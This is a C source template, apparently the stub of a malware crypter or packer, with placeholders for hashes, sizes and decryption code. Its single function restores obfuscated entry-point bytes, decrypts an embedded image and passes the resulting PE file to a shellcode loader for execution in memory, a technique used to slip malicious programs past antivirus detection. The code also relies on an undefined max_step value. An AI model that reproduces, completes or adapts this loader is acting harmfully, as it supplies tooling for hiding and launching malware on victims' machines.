#include <windows.h>
#include <intrin.h>
#include <Ntsecapi.h>
#include <DbgHelp.h>

#pragma  pack(push,1)

typedef struct _LDR_RESTORE_PARAMS
{
	PBYTE	orig_data;
	PBYTE	entr_data;
	DWORD_PTR	base;
	DWORD_PTR   shellAddr;
}LDR_RESTORE_PARAMS, *PLDR_RESTORE_PARAMS;

typedef struct _LDR_PE_LOADER_PARAMS
{
	DWORD_PTR base;
	PVOID file;
	DWORD file_size;
	DWORD flags;
}LDR_PE_LOADER_PARAMS, *PLDR_PE_LOADER_PARAMS;

#pragma pack(pop)

typedef void (WINAPI *TD_ldr_pe_loader)(PLDR_PE_LOADER_PARAMS params);
typedef void(*t_load_shellcode)(LPBYTE lpData, DWORD dwSize, LPVOID _decompressFunc);

void ldr_restore_ep(PLDR_RESTORE_PARAMS params)
{
	DWORD entr_hash = 0x%ENTR_HASH%;
	
	PBYTE entr_data = params->entr_data;
	PBYTE entr_end  = entr_data + 0x%ENTR_SIZE%;
	PBYTE orig_data = params->orig_data;

	UINT32 j,i = 0;
	while( i < 0x%ADDED_BYTES% )
	{
		DWORD pos = entr_hash%max_step;
		DWORD npart = max_step - (pos + 1);
		
		j = 0;
		while( j < max_step )
		{
			if( j!=pos )
			{
				*orig_data++ = *entr_data++;
			}else{
				entr_data = entr_data + 1;
			}
			j++;
		}

		%HASH_STRING%

		i++;
	}

	__movsb(orig_data, entr_data, (entr_end - entr_data));
	
	DWORD decr_hash = 0x%DECRYPT_INIT_HASH%;
	
	i = 0;
	while( i < %ORIG_SIZE% )
	{
		%DECRYPT%
		%DECRYPT_CALC_HASH%
		i++;
	}
	
	LDR_PE_LOADER_PARAMS pe_params;
	
	pe_params.base = params->base;
	pe_params.file = params->orig_data + %LDR_PE_LOADER_SIZE%;
	pe_params.file_size = %FILE_SIZE%;
	pe_params.flags = 0x%FLAGS%;
	
	TD_ldr_pe_loader loader = (TD_ldr_pe_loader)params->orig_data;

	auto _loadShellCode = (t_load_shellcode)params->shellAddr;
	_loadShellCode((LPBYTE)pe_params.file, pe_params.file_size, (LPVOID)params->orig_data);
}